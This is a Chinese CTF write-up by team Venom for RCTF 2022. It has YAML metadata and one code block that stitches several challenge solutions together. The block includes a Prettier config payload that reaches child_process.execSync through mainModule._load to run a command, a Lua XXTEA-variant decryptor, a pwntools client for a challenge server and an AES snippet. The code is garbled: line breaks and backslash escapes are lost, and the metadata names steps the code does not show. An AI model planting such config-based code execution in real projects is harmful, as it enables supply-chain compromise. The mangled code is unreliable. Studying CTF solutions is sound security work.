---
title: 2022 RCTF WriteUp by Venom
contest: RCTF 2022
year: 2022
difficulty: medium
vuln_type:
- rce
- crypto_oracle
tags:
- Prettier
- RCE
- prettierrc.js
- parser
- child_process
- _load
- mainModule
- constructor
- Lua
- TEA
- XXTEA
- bxor
- srand
- math.random
attack_chain:
- 'Prettier RCE: 写 .prettierrc.js 配置 parser 字段'
- 'parser 触发: module.exports = function babel(text, parsers, opts) { return text + flag }'
- flag = exec('/readflag') 通过 global.process.mainModule.constructor._load 拿 child_process.execSync
- 'Crypto Lua: 8 轮 XXTEA 变种 sum=0xB8 delta=0x37'
- b = { key[0], key[1], key[2], key[3] }
- strDecrypt(s, k) 按 2 字符一组解密
- math.random(33, 126) 生成 4 字符密码 srand 爆破
- Decrypt() 调 strDecrypt 拿 flag
key_payload: parser = .prettierrc + _load('child_process').execSync('/readflag')
one_liner: Prettier .prettierrc.js RCE + Lua XXTEA 变种 + srand 爆破
lesson: Prettier 配置 RCE 是 npm 供应链攻击典型；Lua TEA 变种是 reverse/crypto 入门
quality: high
full_path: 2022RCTF_WriteUp_by_Venom.full.md
meta_path: 2022RCTF_WriteUp_by_Venom.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: '2022 RCTF WriteUp by Venom。Prettier .prettierrc.js RCE + Lua XXTEA 变种 + srand 爆破。关键路径：Prettier RCE: 写 .prettierrc.js 配置 parser 字段 → parser 触发: module.exports = function babel(text, parsers, opts) {...'
category: web
subcategory: rce
subcategories:
- rce
- oracle
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/85431.html
wp_author: Venom
reasoning_chain:
- '[触发点] Prettier 用 .prettierrc.js 配 parser 字段 → 假设：parser 字段触发 require / [动作] 写 module.exports = function babel(text, parsers, opts) { return text + flag } / [观察] text=JS 代码 → RCE / [下一步] 拼 exec'
- '[触发点] flag = exec(''/readflag'') → 假设：global.process.mainModule.constructor._load 拿 child_process.execSync / [动作]拼 payload / [观察] 拿到 flag / [下一步] Lua XXTEA'
- '[触发点] Lua XXTEA 变种 sum=0xB8 delta=0x37 → 假设：8 轮 XXTEA / [动作] Python写解密 / [观察] 拿到密文 / [下一步] srand 爆破'
- '[触发点] math.random(33, 126) 生成 4 字符密码 → 假设：srand 爆破 / [动作] 多 srand 试 33..126 / [观察] 命中 → flag'
failed_attempts:
- 试图用 prettier 默认 parser → 失败：必须自定义才能触发 require
- 试图直接对密文 XXTEA → 失败：缺密码
key_observations:
- Prettier 配置 RCE 是 npm 供应链攻击典型
- Lua TEA 变种 sum/delta 不同
- C srand 爆破 + math.random 是密码学综合
prerequisites:
- Prettier 配置加载机制
- NodeJS child_process.execSync 通过 mainModule.constructor._load 加载
- XXTEA 加密算法
- Lua 字符串处理
---
# 2022RCTF WriteUp by Venom

> 原文: https://www.ctfiot.com/85431.html
> ID: 85431

招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱

admin@chamd5.org(带上简历和想加入的小组)

A “prettier” key in your package.json file.

A .prettierrc file written in JSON or YAML.

A .prettierrc.json, .prettierrc.yml, .prettierrc.yaml, or .prettierrc.json5 file.

A .prettierrc.js, .prettierrc.cjs, prettier.config.js, or prettier.config.cjs file that exports an object using module.exports.

A .prettierrc.toml file.

结束

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
trailingComma: "es5"tabWidth: 4semi: falsesingleQuote: trueparser: ".prettierrc"d: var load = global.process.mainModule.constructor._loada: function exec(cmd){return load('child_process').execSync(cmd).toString()}b: var flag = exec("/readflag")p1: function babel(text, parsers, opts = {}) {return text+flag};p2: module.exports=babel
function to8(n)
    return n % 256
end

function bxor(a, b)
    local p = 0
    local i = 0
    for i = 0, 7, 1 do
        p = p + 2 ^ i * ((a % 2 + b % 2) % 2)
        a = math.floor(a / 2)
        b = math.floor(b / 2)
        if a == 0 and b == 0 then break end
    end
    return p
end

function encrypt(v, k)
    local sum = 0
    local delta = 0x37
    local i = 0
    for i = 1, 8, 1 do
        sum = to8(sum + delta)
        v[1] = to8(v[1] + to8(bxor(bxor(to8((v[2] * 16) + k[1]), to8(v[2] + sum)), to8(math.floor(v[2] / 32) + k[2]))))
        v[2] = to8(v[2] + to8(bxor(bxor(to8((v[1] * 16) + k[3]), to8(v[1] + sum)), to8(math.floor(v[1] / 32) + k[4]))))
    end
end

function decrypt(v, k)
    local sum = 0xB8
    local delta = 0x37
    local i = 0
    for i = 1, 8, 1 do
        v[2] = to8(v[2] - to8(bxor(bxor(to8((v[1] * 16) + k[3]), to8(v[1] + sum)), to8(math.floor(v[1] / 32) + k[4]))))
        v[1] = to8(v[1] - to8(bxor(bxor(to8((v[2] * 16) + k[1]), to8(v[2] + sum)), to8(math.floor(v[2] / 32) + k[2]))))
        sum = sum - delta
    end
end

function passGen()
    local pw = ""
    local j
    for i = 1, 4, 1 do
        j = math.random(33, 126)
        if j == 96 then pw = pw .. "_"
        else pw = pw .. string.char(j) end
    end
    return pw
end

function strDecrypt(s, k)
    local b = {}
    local c = {}
    local i
    local j
    j = string.gmatch(k, ".")
    b = { string.byte(j()), string.byte(j()), string.byte(j()), string.byte(j()) }
    j = ""
    for i = 1, string.len(s) / 2, 1 do
        c = { string.byte(string.sub(s, i * 2 - 1, i * 2 - 1)), string.byte(string.sub(s, i * 2, i * 2)) }
        decrypt(c, b)
        j = j .. string.char(c[1])
        if c[2] == 0 then break end
        j = j .. string.char(c[2])
    end
    return j
end

function Decrypt()
    local key = "MOON"
    local s = {157,89,215,46,13,189,237,23,241,49,84,146,248,150,138,183,119,52,34,174,146,132,225,192,5,220,221,176,184,218,19,87,249,122}
    flag = ""
    for i = 1, #s, 1 do
        flag = flag .. string.char(s[i])
    end
    flag = strDecrypt(flag, key)
    print(flag)
end

Decrypt()
from pwn import *
from Crypto.Util.number import *
a=remote("190.92.234.114",23334)
l=a.recvline().split(b'=')[1]
b=a.recvline().split(b'=')[1]
d=b[2:-2].split(b',')
c=a.recvline().split(b'=')[1]
e=c[2:-2].split(b',')
T=[]
U=[]
for i in range(len(d)):
    T.append(int(d[i]))
    U.append(int(e[i]))
x = 0
y=0
for i in range(len(T)):
   x += U[i]
   y+=T[i]
x = x // y
x=long_to_bytes(x)
    #print(x)
m=sorted('rctf_')
s=''
for i in range(len(m)):
    s+=m[i]
x = x[:15]+s.encode()
x= bytes_to_long(x)
a.sendlineafter(b"x = ",str(x).encode())
a.interactive()
import base64
from Crypto.Cipher import AES

r=b'SVTsfWzSYGPWdYXodVbvbni6doHzSi=='
b64_tab=b'+/EFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789ABCD'
b58_tab=b'rpshnaf39wBUDNEGHJKLM4PQRST7VWXYZ2bcdeCg65jkm8oFqi1tuvAxyz'
r=b'x49x67xebx32x9dx05x61xdaxdbx07xd7x5axb9x01xb2x46'
b_0x41140=b'goodlucksmartman'

aes=AES.new(b_0x41140,AES.MODE_ECB)
aes.decrypt(r)
  flag{rtyhgf!@#$}
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]